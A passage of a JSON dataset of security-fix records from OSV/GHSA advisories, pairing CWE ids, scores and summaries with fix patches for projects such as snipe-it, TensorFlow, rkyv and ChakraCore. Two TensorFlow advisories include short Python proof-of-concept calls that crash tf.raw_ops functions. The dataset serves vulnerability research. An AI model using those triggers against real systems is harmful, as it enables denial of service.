haridasan <sujith@moodle.com>","language":"en","entities":"[('fix', 'ACTION', ''), ('issue', 'FLAW', ''), ('ensures', 'ACTION', ''), ('sujith@moodle.com', 'EMAIL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/authlib.php'])","num_files":1.0},{"index":3211,"vuln_id":"GHSA-w3v3-cxq5-9vr4","cwe_id":"{'CWE-276', 'CWE-284'}","score":6.3,"chain":"{'https:\/\/github.com\/snipe\/snipe-it\/commit\/cf14a0222c67472086cd08b2155f045edaf75f2e'}","dataset":"osv","summary":"Incorrect Default Permissions and Improper Access Control in snipe-it snipe-it is vulnerable to Improper Access Control\/Incorrect Default Permissions.","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/snipe\/snipe-it","commit_href":"https:\/\/github.com\/snipe\/snipe-it\/commit\/cf14a0222c67472086cd08b2155f045edaf75f2e","commit_sha":"cf14a0222c67472086cd08b2155f045edaf75f2e","patch":"SINGLE","chain_ord":"['cf14a0222c67472086cd08b2155f045edaf75f2e']","before_first_fix_commit":"{'b78e610ce3b4295fb4c56659976a5d5d26eeb6da', 'bb095641c2f421f744796d184287c46fc9303591'}","last_fix_commit":"cf14a0222c67472086cd08b2155f045edaf75f2e","chain_ord_pos":1.0,"commit_datetime":"01\/11\/2022, 03:24:31","message":"Merge pull request #10498 from Haxatron\/master\n\nFix access control","author":"snipe","comments":null,"stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'app\/Http\/Controllers\/BulkAssetModelsController.php': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/snipe\/snipe-it\/raw\/cf14a0222c67472086cd08b2155f045edaf75f2e\/app%2FHttp%2FControllers%2FBulkAssetModelsController.php', 'patch': \"@@ -32,6 +32,7 @@ public function edit(Request $request)\\n \\n             \/\/ If deleting....\\n             if ($request->input('bulk_actions')=='delete') {\\n+                $this->authorize('delete', AssetModel::class);\\n                 $valid_count = 0;\\n                 foreach ($models as $model) {\\n                     if ($model->assets_count == 0) {\\n@@ -42,7 +43,7 @@ public function edit(Request $request)\\n \\n             \/\/ Otherwise display the bulk edit screen\\n             }\\n-\\n+            $this->authorize('update', AssetModel::class);\\n             $nochange = ['NC' => 'No Change'];\\n             return view('models\/bulk-edit', compact('models'))\\n                 ->with('fieldset_list', $nochange + Helper::customFieldsetList())\\n@@ -63,7 +64,8 @@ public function edit(Request $request)\\n      *\/\\n     public function update(Request $request)\\n     {\\n-\\n+        $this->authorize('update', AssetModel::class);\\n+      \\n         $models_raw_array = $request->input('ids');\\n         $update_array = array();\\n \\n@@ -103,6 +105,8 @@ public function update(Request $request)\\n      *\/\\n     public function destroy(Request $request)\\n     {\\n+        $this->authorize('delete', AssetModel::class);\\n+      \\n         $models_raw_array = $request->input('ids');\\n \\n         if ((is_array($models_raw_array)) && (count($models_raw_array) > 0)) {\"}}","message_norm":"merge pull request #10498 from haxatron\/master\n\nfix access control","language":"en","entities":"[('#10498', 'ISSUE', ''), ('access control', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Http\/Controllers\/BulkAssetModelsController.php'])","num_files":1.0},{"index":3225,"vuln_id":"GHSA-w4xf-2pqw-5mq7","cwe_id":"{'CWE-824'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7a4de6adfbd303ce08be4332554dff70362612'}","dataset":"osv","summary":"Reference binding to nullptr in `RaggedTensorToVariant` ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.RaggedTensorToVariant`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.RaggedTensorToVariant(\n  rt_nested_splits=[],\n  rt_dense_values=[1,2,3],\n  batched_input=True)\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/ragged_tensor_to_variant_op.cc#L129) has an incomplete validation of the splits values, missing the case when the argument would be empty.\n\n### Patches\nWe have patched the issue in GitHub commit [be7a4de6adfbd303ce08be4332554dff70362612](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7a4de6adfbd303ce08be4332554dff70362612).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/be7a4de6adfbd303ce08be4332554dff70362612","commit_sha":"be7a4de6adfbd303ce08be4332554dff70362612","patch":"SINGLE","chain_ord":"['be7a4de6adfbd303ce08be4332554dff70362612']","before_first_fix_commit":"{'ffbdacfce0c9c8f627d0ce89d9d4db8fd0a7cfd1'}","last_fix_commit":"be7a4de6adfbd303ce08be4332554dff70362612","chain_ord_pos":1.0,"commit_datetime":"07\/29\/2021, 21:05:34","message":"Ensure non-empty rt_nested_splits in tf.raw_ops.RaggedTensorToVariant\n\nPiperOrigin-RevId: 387664237\nChange-Id: Ia1700c34b5610873d63561abc86e23b46ead93b3","author":"Laura Pak","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/ragged_tensor_to_variant_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/be7a4de6adfbd303ce08be4332554dff70362612\/tensorflow%2Fcore%2Fkernels%2Fragged_tensor_to_variant_op.cc', 'patch': '@@ -157,6 +157,12 @@ class RaggedTensorToVariantOp : public OpKernel {\\n       return;\\n     }\\n \\n+    \/\/ Checked here instead of at input in case batched_input_ is false\\n+    OP_REQUIRES(context, ragged_nested_splits_len > 0,\\n+                errors::InvalidArgument(\\n+                    \"rt_nested_splits must be a list of one or more, but \"\\n+                    \"received rt_nested_splits of length 0.\"));\\n+\\n     \/\/ Unbatch the Ragged Tensor and encode the components.\\n     std::vector<RaggedTensorVariant> unbatched_ragged_input;\\n     auto batched_splits_top_vec ='}}","message_norm":"ensure non-empty rt_nested_splits in tf.raw_ops.raggedtensortovariant\n\npiperorigin-revid: 387664237\nchange-id: ia1700c34b5610873d63561abc86e23b46ead93b3","language":"en","entities":"[('ensure', 'ACTION', ''), ('387664237', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/ragged_tensor_to_variant_op.cc'])","num_files":1.0},{"index":3228,"vuln_id":"GHSA-w5cr-frph-hw7f","cwe_id":"{'CWE-908'}","score":7.5,"chain":"{'https:\/\/github.com\/djkoloski\/rkyv\/commit\/f141b560523a20557db6540576d153010bd18712', 'https:\/\/github.com\/djkoloski\/rkyv\/commit\/9c65ae9c2c67dd949b5c3aba9b8eba6da802ab7e'}","dataset":"osv","summary":"Use of uninitialized buffer in rkyv An issue was discovered in the rkyv crate before 0.6.0 for Rust. When an archive is created via serialization, the archive content may contain uninitialized values of certain parts of a struct.","published_date":"2021-08-25","chain_len":2,"project":"https:\/\/github.com\/djkoloski\/rkyv","commit_href":"https:\/\/github.com\/djkoloski\/rkyv\/commit\/f141b560523a20557db6540576d153010bd18712","commit_sha":"f141b560523a20557db6540576d153010bd18712","patch":"MULTI","chain_ord":"['f141b560523a20557db6540576d153010bd18712', '9c65ae9c2c67dd949b5c3aba9b8eba6da802ab7e']","before_first_fix_commit":"{'f141b560523a20557db6540576d153010bd18712'}","last_fix_commit":"9c65ae9c2c67dd949b5c3aba9b8eba6da802ab7e","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 14:44:41","message":"Zero aligned memory before resolving","author":"David Koloski","comments":null,"stats":"{'additions': 5, 'deletions': 5, 'total': 10}","files":"{'rkyv\/src\/ser\/serializers\/std.rs': {'additions': 5, 'deletions': 5, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rkyv\/rkyv\/raw\/f141b560523a20557db6540576d153010bd18712\/rkyv%2Fsrc%2Fser%2Fserializers%2Fstd.rs', 'patch': '@@ -116,11 +116,11 @@ impl<A: Borrow<AlignedVec> + BorrowMut<AlignedVec>> Serializer for AlignedSerial\\n         let additional = mem::size_of::<T::Archived>();\\n         vec.reserve(additional);\\n         vec.set_len(vec.len() + additional);\\n-        value.resolve(\\n-            pos,\\n-            resolver,\\n-            &mut *vec.as_mut_ptr().add(pos).cast::<mem::MaybeUninit<T::Archived>>()\\n-        );\\n+\\n+        let ptr = vec.as_mut_ptr().add(pos).cast::<mem::MaybeUninit<T::Archived>>();\\n+        core::ptr::write_bytes(ptr, 0, 1);\\n+\\n+        value.resolve(pos, resolver, &mut *ptr);\\n         Ok(pos)\\n     }'}}","message_norm":"zero aligned memory before resolving","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['rkyv\/src\/ser\/serializers\/std.rs'])","num_files":1.0},{"index":3235,"vuln_id":"GHSA-w6cx-qg2q-rvq8","cwe_id":"{'CWE-22'}","score":7.6,"chain":"{'https:\/\/github.com\/Finastra\/ssr-pages\/pull\/1\/commits\/c3e4c563384ae3ba3892f37dd190218577620780'}","dataset":"osv","summary":"Path Traversal in @finastra\/ssr-pages A path traversal issue can occur when providing untrusted input to the `svg` property as an argument to the `build(MessagePageOptions)` function.\n\n### References\n- https:\/\/github.com\/Finastra\/ssr-pages\/pull\/1\n- https:\/\/github.com\/Finastra\/ssr-pages\/pull\/1\/commits\/c3e4c563384ae3ba3892f37dd190218577620780","published_date":"2022-03-01","chain_len":1,"project":"https:\/\/github.com\/Finastra\/ssr-pages","commit_href":"https:\/\/github.com\/Finastra\/ssr-pages\/pull\/1\/commits\/c3e4c563384ae3ba3892f37dd190218577620780","commit_sha":"c3e4c563384ae3ba3892f37dd190218577620780","patch":"SINGLE","chain_ord":"['c3e4c563384ae3ba3892f37dd190218577620780']","before_first_fix_commit":"{'a61ab5a82983ad2d0779454f929bbb76f00ed605'}","last_fix_commit":"c3e4c563384ae3ba3892f37dd190218577620780","chain_ord_pos":1.0,"commit_datetime":"02\/25\/2022, 14:09:28","message":"fix: Fix path traversal vulnerability","author":"David Bocl\u00e9","comments":null,"stats":"{'additions': 10, 'deletions': 1, 'total': 11}","files":"{'src\/helpers\/inlineSVG.helper.ts': {'additions': 10, 'deletions': 1, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Finastra\/ssr-pages\/raw\/c3e4c563384ae3ba3892f37dd190218577620780\/src%2Fhelpers%2FinlineSVG.helper.ts', 'patch': \"@@ -2,6 +2,15 @@ import { readFileSync } from 'fs';\\n import { join } from 'path';\\r\\n \\r\\n export default function inlineSVG(iconName) {\\r\\n-  const path = join(__dirname, `..\/assets\/img\/${iconName}.svg`);\\r\\n+  const path = join(__dirname, `..\/assets\/img\/${iconNameWhitelist(iconName)}.svg`);\\r\\n   return readFileSync(path, 'utf8');\\r\\n }\\r\\n+\\r\\n+function iconNameWhitelist(iconName) {\\r\\n+  const fallbackIconName = 'warning'\\r\\n+  const whitelist = ['warning', 'exit'];\\r\\n+  if (!whitelist.includes(iconName)) {\\r\\n+    return fallbackIconName;\\r\\n+  }\\r\\n+  return iconName;\\r\\n+}\\n\\\\ No newline at end of file\"}}","message_norm":"fix: fix path traversal vulnerability","language":"ca","entities":"[('fix', 'ACTION', ''), ('path traversal', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/helpers\/inlineSVG.helper.ts'])","num_files":1.0},{"index":3240,"vuln_id":"GHSA-w74j-v8xh-3w5h","cwe_id":"{'CWE-824'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2e0ee46f1a47675152d3d865797a18358881d7a6'}","dataset":"osv","summary":"Reference binding to nullptr in unicode encoding ### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\nfrom tensorflow.python.ops import gen_string_ops\n\ngen_string_ops.unicode_encode(\n  input_values=[],\n  input_splits=[],\n  output_encoding='UTF-8',\n  errors='ignore',\n  replacement_char='a')\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/kernels\/unicode_ops.cc#L533-L539) reads the first dimension of the `input_splits` tensor before validating that this tensor is not empty: \n\n```cc\n  const Tensor& input_splits = context->input(1);\n  const auto input_splits_flat = input_splits.flat<SPLITS_TYPE>();\n  TensorShape output_shape({input_splits.dim_size(0) - 1});\n```\n\n### Patches\nWe have patched the issue in GitHub commit [2e0ee46f1a47675152d3d865797a18358881d7a6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2e0ee46f1a47675152d3d865797a18358881d7a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/2e0ee46f1a47675152d3d865797a18358881d7a6","commit_sha":"2e0ee46f1a47675152d3d865797a18358881d7a6","patch":"SINGLE","chain_ord":"['2e0ee46f1a47675152d3d865797a18358881d7a6']","before_first_fix_commit":"{'9c87c32c710d0b5b53dc6fd3bfde4046e1f7a5ad'}","last_fix_commit":"2e0ee46f1a47675152d3d865797a18358881d7a6","chain_ord_pos":1.0,"commit_datetime":"07\/27\/2021, 19:30:33","message":"Ensure non-empty input_splits in tf.raw_ops.UnicodeEncode\n\nPiperOrigin-RevId: 387170080\nChange-Id: I3b489acc51c5cb4124c535b9df7cc6e62ef21766","author":"Laura Pak","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'tensorflow\/core\/kernels\/unicode_ops.cc': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/2e0ee46f1a47675152d3d865797a18358881d7a6\/tensorflow%2Fcore%2Fkernels%2Funicode_ops.cc', 'patch': '@@ -533,6 +533,10 @@ class UnicodeEncodeOp : public OpKernel {\\n     const Tensor& input_splits = context->input(1);\\n     const auto input_splits_flat = input_splits.flat<SPLITS_TYPE>();\\n \\n+    OP_REQUIRES(\\n+        context, input_splits.NumElements() > 0,\\n+        errors::InvalidArgument(\"Input_splits should contain elements, but \"\\n+                                \"given input_values has 0 elements\"));\\n     \/\/ Operation will treat first argument in input_splits as if it were zero\\n     \/\/ regardless of its actual value since splits should begin with zero and\\n     \/\/ end with the length of the input values vector.'}}","message_norm":"ensure non-empty input_splits in tf.raw_ops.unicodeencode\n\npiperorigin-revid: 387170080\nchange-id: i3b489acc51c5cb4124c535b9df7cc6e62ef21766","language":"en","entities":"[('ensure', 'ACTION', ''), ('tf.raw_ops.unicodeencode', 'SECWORD', ''), ('387170080', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/unicode_ops.cc'])","num_files":1.0},{"index":3241,"vuln_id":"GHSA-w77p-8cfg-2x43","cwe_id":"{'CWE-284'}","score":9.8,"chain":"{'https:\/\/github.com\/qos-ch\/slf4j\/commit\/d2b27fba88e983f921558da27fc29b5f5d269405'}","dataset":"osv","summary":"Improper Access Control in SLF4J org.slf4j.ext.EventData in the slf4j-ext module in QOS.CH SLF4J before `1.8.0-beta4` allows remote attackers to bypass intended access restrictions via crafted data. EventData in the slf4j-ext module in QOS.CH SLF4J, has been fixed in SLF4J version `1.7.26` and later and in the `2.0.x` series.\n\nNote that while the [fix commit](https:\/\/github.com\/qos-ch\/slf4j\/commit\/d2b27fba88e983f921558da27fc29b5f5d269405) is associated with the tag `1.8.0-beta3`, the versions in [Maven](https:\/\/mvnrepository.com\/artifact\/org.slf4j\/slf4j-ext) go directly from `1.8.0-beta2` to `1.8.0-beta4`.","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/qos-ch\/slf4j","commit_href":"https:\/\/github.com\/qos-ch\/slf4j\/commit\/d2b27fba88e983f921558da27fc29b5f5d269405","commit_sha":"d2b27fba88e983f921558da27fc29b5f5d269405","patch":"SINGLE","chain_ord":"['d2b27fba88e983f921558da27fc29b5f5d269405']","before_first_fix_commit":"{'0ec1f6aac8648e87a7dda2f5730fef6db3b4fa33'}","last_fix_commit":"d2b27fba88e983f921558da27fc29b5f5d269405","chain_ord_pos":1.0,"commit_datetime":"03\/14\/2018, 00:09:26","message":"fix SLF4J-431","author":"Ceki Gulcu","comments":"{'com_1': {'author': 'kbabioch', 'datetime': '03\/20\/2018, 08:48:11', 'body': 'What exactly is the issue here? Unfortunately there seem to be no details available on this, and marking a class \"deprecated\" is not necessarily a real fix.'}, 'com_2': {'author': 'ceki', 'datetime': '03\/20\/2018, 08:50:32', 'body': '@kbabioch  Are you using the EventData class?'}, 'com_3': {'author': 'kbabioch', 'datetime': '03\/20\/2018, 09:10:00', 'body': \"@ceki I'm evaluating this issue, and realized that basically no details are available yet :-\/.\"}, 'com_4': {'author': 'ceki', 'datetime': '03\/20\/2018, 09:18:17', 'body': 'SLF4J-431 is a subtask of SLF4J-430. EventData is slated to be removed due to a security vulnerability.'}, 'com_5': {'author': 'adioss', 'datetime': '12\/14\/2018, 16:02:22', 'body': 'Regarding http:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2018-8088, as far as I understand, solution is to update to version to 1.8.0-beta2.\\r\\nHowever, on https:\/\/jira.qos.ch\/browse\/SLF4J-430, you can see that fix version is 1.8.0-beta3.\\r\\nSo, what could we advice in order to fix the threat?'}, 'com_6': {'author': 'ceki', 'datetime': '12\/14\/2018, 21:07:48', 'body': 'As far as I know, org.slf4j.ext.EventData is not widely used.'}, 'com_7': {'author': 'areguru', 'datetime': '12\/20\/2018, 17:28:49', 'body': \"@adioss \\r\\nI suppose you use the OWASP dependency-checker or similar and got a warning about CVE-2018-8088.\\r\\n(In that case same as us)\\r\\n\\r\\nMy understanding after analyzing this is that only the slf4j-ext module has the vulnerability, and only the EventData-class is affected. Most users of SLF4J doesn't use this. \\r\\nhttps:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-8088\\r\\nhttps:\/\/mvnrepository.com\/artifact\/org.slf4j\/slf4j-ext\\r\\n   groupId: org.slf4j\\r\\n   artifactId: slf4j-ext\\r\\n   version: 1.7.25\\r\\n\\r\\nSLF4J extensions are packaged within slf4j-ext.jar\\r\\nhttps:\/\/www.slf4j.org\/extensions.html\\r\\n\\r\\nIf you use maven \\r\\nmvn dependency:tree\\r\\nwill generate the dependencies tree of your maven project.\\r\\n\\r\\nFor us the flagging of slf4j-api as vulnerable was a false positive.\\r\\nhttps:\/\/mvnrepository.com\/artifact\/org.slf4j\/slf4j-api\\r\\n   groupId: org.slf4j\\r\\n   artifactId: slf4j-api\\r\\n   version: 1.7.25\\r\\n\\r\\nYou have to check if your application actually use slf4j-ext (and org.slf4j.ext.EventData)\"}, 'com_8': {'author': 'adioss', 'datetime': '12\/20\/2018, 23:42:45', 'body': '@areguru yep exactly that, you\\'ve got it: CVE is \"badly\" declared so, although only slf4j-ext is sensitive, cpe declaration is too large so slf4j-* are detected by sca tools like dependency-check.\\r\\n\\r\\nAlthough I have no dependencies on slf4j-ext on my projects, for other people that have slf4j-ext in the classpath, I was wandering if \"mark as deprecated\" was enough and if they is no other way to exploit the threat than using the constructor directly (using deserialization for example) but finally I\\'m not sure it\\'s possible.\\r\\nThanks a lot @areguru  and @ceki for feedback.'}, 'com_9': {'author': 'sepe81', 'datetime': '01\/09\/2019, 09:47:27', 'body': 'According to https:\/\/www.slf4j.org\/download.html version 1.8.0-beta2 is EXPERIMENTAL. Are there any plans to backport this to the STABLE branch 1.7.x and release a version 1.7.26?'}, 'com_10': {'author': 'cowwoc', 'datetime': '01\/09\/2019, 14:50:50', 'body': '@adioss I emailed nvd@nist.gov asking them to fix the CVE but got back this nice auto-reply: `Due to a lapse in appropriations, I will be out of the office and unable to reply to e-mail until further notice.` :)'}, 'com_11': {'author': 'cowwoc', 'datetime': '01\/09\/2019, 15:22:45', 'body': \"Looking again, it looks like I was supposed to email mitre.org instead of nist.gov. I did now and they seem to be active. I'll let you know once I hear back from them.\"}, 'com_12': {'author': 'cowwoc', 'datetime': '01\/10\/2019, 16:42:30', 'body': \"Hey guys. I've just heard back from nist.gov. They will be updating the CVE for slf4j (and 700 others) within the next 24 hours to fix this kind of error (overly-broad warnings). If you guys run across this kind of error in the future, I recommend reporting it to them. They were extremely responsive and helpful. Have a great day :)\"}, 'com_13': {'author': 'markkolich', 'datetime': '01\/25\/2019, 20:02:29', 'body': \"@ceki following up on @sepe81's comment above, according to slf4j.org [0], version `1.8.0-beta2` is marked experimental but this version has been available for almost a year [1].\\r\\n\\r\\nIf I can gently ask, what is the plan\/timeline for releasing a non-beta version of `1.8.0`?\\r\\n\\r\\n[0] https:\/\/www.slf4j.org\/download.html\\r\\n[1] https:\/\/github.com\/qos-ch\/slf4j\/releases\/tag\/v_1.8.0_beta2\"}, 'com_14': {'author': 'cowwoc', 'datetime': '01\/25\/2019, 20:42:43', 'body': 'I am hoping https:\/\/jira.qos.ch\/browse\/SLF4J-428 gets fixed before 1.8.0 is released because it will affect the Java module name.'}, 'com_15': {'author': 'Neustradamus', 'datetime': '01\/13\/2022, 20:30:30', 'body': 'Dear @kbabioch, @adioss, @areguru, @sepe81, @cowwoc, @markkolich,\\r\\n\\r\\nIn first, I wish you a Happy New Year 2022!\\r\\n\\r\\nToday, there was a progress by @ceki, and a correction about my old requests:\\r\\n- https:\/\/jira.qos.ch\/browse\/SLF4J-455\\r\\n\\r\\nIt has been solved in 1.7.26 and 1.8.0-beta4.\\r\\n\\r\\nI have requested the update of:\\r\\n- https:\/\/jira.qos.ch\/browse\/SLF4J-430\\r\\n- https:\/\/jira.qos.ch\/browse\/SLF4J-431\\r\\n\\r\\nAnd about CVE-2018-8088:\\r\\n- https:\/\/cve.mitre.org\/cgi-bin\/cvekey.cgi?keyword=slf4j+slf4j+log4j12\\r\\n- https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2018-8088\\r\\n- https:\/\/www.google.com\/search?q=CVE-2018-8088\\r\\n\\r\\nLinked to:\\r\\n- https:\/\/github.com\/qos-ch\/reload4j\/issues\/10'}}","stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'slf4j-ext\/src\/main\/java\/org\/slf4j\/ext\/EventData.java': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/qos-ch\/slf4j\/raw\/d2b27fba88e983f921558da27fc29b5f5d269405\/slf4j-ext%2Fsrc%2Fmain%2Fjava%2Forg%2Fslf4j%2Fext%2FEventData.java', 'patch': '@@ -40,6 +40,8 @@\\n  * event. Users may extend this class for each EventType they want to log.\\n  * \\n  * @author Ralph Goers\\n+ * \\n+ * @deprecated Due to a security vulnerability, this class will be removed without replacement.\\n  *\/\\n public class EventData implements Serializable {'}}","message_norm":"fix slf4j-431","language":"sv","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['slf4j-ext\/src\/main\/java\/org\/slf4j\/ext\/EventData.java'])","num_files":1.0},{"index":3247,"vuln_id":"GHSA-w89r-qch4-8jv5","cwe_id":"{'CWE-787'}","score":7.5,"chain":"{'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/d797e3f00e34c12c8c0ae52f56344325439dccd7', 'https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/936a5af1c07e0fdec9aab85c05339dabe4aaeeb1'}","dataset":"osv","summary":"Out-of-bounds write A remote code execution vulnerability exists in the way that the Chakra scripting engine handles objects in memory in Microsoft Edge, aka 'Chakra Scripting Engine Memory Corruption Vulnerability'. This CVE ID is unique from CVE-2019-0913, CVE-2019-0914, CVE-2019-0915, CVE-2019-0916, CVE-2019-0917, CVE-2019-0922, CVE-2019-0923, CVE-2019-0924, CVE-2019-0925, CVE-2019-0927, CVE-2019-0933, CVE-2019-0937.","published_date":"2021-03-29","chain_len":2,"project":"https:\/\/github.com\/chakra-core\/ChakraCore","commit_href":"https:\/\/github.com\/chakra-core\/ChakraCore\/commit\/936a5af1c07e0fdec9aab85c05339dabe4aaeeb1","commit_sha":"936a5af1c07e0fdec9aab85c05339dabe4aaeeb1","patch":"MULTI","chain_ord":"['936a5af1c07e0fdec9aab85c05339dabe4aaeeb1', 'd797e3f00e34c12c8c0ae52f56344325439dccd7']","before_first_fix_commit":"{'ea0491305137183603bf43844b5584d4cc972e28', '4594e340bc9ca9f857010a68e8b562d65b46eed6'}","last_fix_commit":"d797e3f00e34c12c8c0ae52f56344325439dccd7","chain_ord_pos":1.0,"commit_datetime":"04\/17\/2019, 17:18:03","message":"[CVE-2019-0912]","author":"Michael Holman","comments":null,"stats":"{'additions': 24, 'deletions': 7, 'total': 31}","files":"{'lib\/Backend\/GlobOptFields.cpp': {'additions': 24, 'deletions': 7, 'changes': 31, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/chakra-core\/ChakraCore\/raw\/936a5af1c07e0fdec9aab85c05339dabe4aaeeb1\/lib%2FBackend%2FGlobOptFields.cpp', 'patch': '@@ -415,11 +415,19 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo\\n \\n     case Js::OpCode::InlineArrayPush:\\n     case Js::OpCode::InlineArrayPop:\\n-        KillLiveFields(this->lengthEquivBv, bv);\\n-        if (inGlobOpt)\\n+        if(instr->m_func->GetThisOrParentInlinerHasArguments())\\n         {\\n-            \/\/ Deleting an item, or pushing a property to a non-array, may change object layout\\n-            KillAllObjectTypes(bv);\\n+            this->KillAllFields(bv);\\n+            this->SetAnyPropertyMayBeWrittenTo();\\n+        }\\n+        else\\n+        {\\n+            KillLiveFields(this->lengthEquivBv, bv);\\n+            if (inGlobOpt)\\n+            {\\n+                \/\/ Deleting an item, or pushing a property to a non-array, may change object layout\\n+                KillAllObjectTypes(bv);\\n+            }\\n         }\\n         break;\\n \\n@@ -444,14 +452,23 @@ GlobOpt::ProcessFieldKills(IR::Instr *instr, BVSparse<JitArenaAllocator> *bv, bo\\n                 \/\/ Kill length field for built-ins that can update it.\\n                 if (nullptr != this->lengthEquivBv)\\n                 {\\n-                    KillLiveFields(this->lengthEquivBv, bv);\\n+                    \/\/ If has arguments, all fields are killed in fall through\\n+                    if (!instr->m_func->GetThisOrParentInlinerHasArguments())\\n+                    {\\n+                        KillLiveFields(this->lengthEquivBv, bv);\\n+                    }\\n                 }\\n                 \/\/ fall through\\n \\n             case IR::JnHelperMethod::HelperArray_Reverse:\\n-                \/\/ Deleting an item may change object layout\\n-                if (inGlobOpt)\\n+                if (instr->m_func->GetThisOrParentInlinerHasArguments())\\n+                {\\n+                    this->KillAllFields(bv);\\n+                    this->SetAnyPropertyMayBeWrittenTo();\\n+                }\\n+                else if (inGlobOpt)\\n                 {\\n+                    \/\/ Deleting an item may change object layout\\n                     KillAllObjectTypes(bv);\\n                 }\\n                 break;'}}","message_norm":"[cve-2019-0912]","language":"ro","entities":"[('cve-2019-0912', 'VULNID', 'CVE')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/Backend\/GlobOptFields.cpp'])","num_files":1.0},{"index":3249,"vuln_id":"GHSA-w8f3-pvx4-4c3h","cwe_id":"{'CWE-1321'}","score":0.0,"chain":"{'https:\/\/github.com\/Quernest\/arr-flatten-unflatten\/commit\/cb4351c75f87a4fbec3b6140c40ee2993f574372'}","dataset":"osv","summary":"Prototype Pollution in arr-flatten-unflatten All versions of package arr-flatten-unflatten up to and including version 1.1.4 are vulnerable to Prototype Pollution via the constructor.","published_date":"2021-05-06","chain_len":1,"project":"https:\/\/github.com\/Quernest\/arr-flatten-unflatten","commit_href":"https:\/\/github.com\/Quernest\/arr-flatten-unflatten\/commit\/cb4351c75f87a4fbec3b6140c40ee2993f574372","commit_sha":"cb4351c75f87a4fbec3b6140c40ee2993f574372","patch":"SINGLE","chain_ord":"['cb4351c75f87a4fbec3b6140c40ee2993f574372']","before_first_fix_commit":"{'f4ccf0a8d55288490e729233fe2885eec15f74d0', '28bf4357297b67730ec1db002c001a76cd349b61'}","last_fix_commit":"cb4351c75f87a4fbec3b6140c40ee2993f574372","chain_ord_pos":1.0,"commit_datetime":"01\/25\/2021, 20:45:17","message":"Merge pull request #8 from 418sec\/1-npm-arr-flatten-unflatten\n\nSecurity Fix for Prototype Pollution - huntr.dev","author":"Quernest","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'unflatten.js': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Quernest\/arr-flatten-unflatten\/raw\/cb4351c75f87a4fbec3b6140c40ee2993f574372\/unflatten.js', 'patch': '@@ -10,6 +10,8 @@ 